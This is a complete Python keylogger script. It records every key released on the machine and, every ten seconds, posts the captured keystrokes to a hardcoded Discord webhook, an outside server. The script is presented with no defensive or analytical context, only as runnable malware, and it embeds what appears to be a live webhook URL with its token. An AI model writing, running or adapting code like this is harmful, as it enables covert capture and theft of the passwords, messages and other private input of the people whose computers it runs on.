import time
import keyboard  # Ensure you import the correct module
import requests
import threading

WEBHOOK_URL = "https://discord.com/api/webhooks/1279372469433663610/IoxbYL1_gBuvmHH-vah6ZHuce6fSlCQBQcLA_Y34nS4pGNXUjtweWYwlOam6Eqq-CwBy"

keylogs = []  # Initialize keylogs list

def send_keylogs():
    global keylogs

    if keylogs:
        keylogs_str = '\n'.join(keylogs)

        payload = {
            'content': keylogs_str
        }
        requests.post(WEBHOOK_URL, data=payload)

        keylogs = []

    # Schedule the function to run again in 10 seconds
    threading.Timer(10, send_keylogs).start()

def capture_keystrokes(event):
    global keylogs
    if event.name != 'space':  # Optional: Adjust to filter out specific keys if needed
        keylogs.append(event.name)

# Start listening for keyboard events
keyboard.on_release(callback=capture_keystrokes)

# Start sending key logs periodically
send_keylogs()

# Keep the script running
while True:
    time.sleep(1)
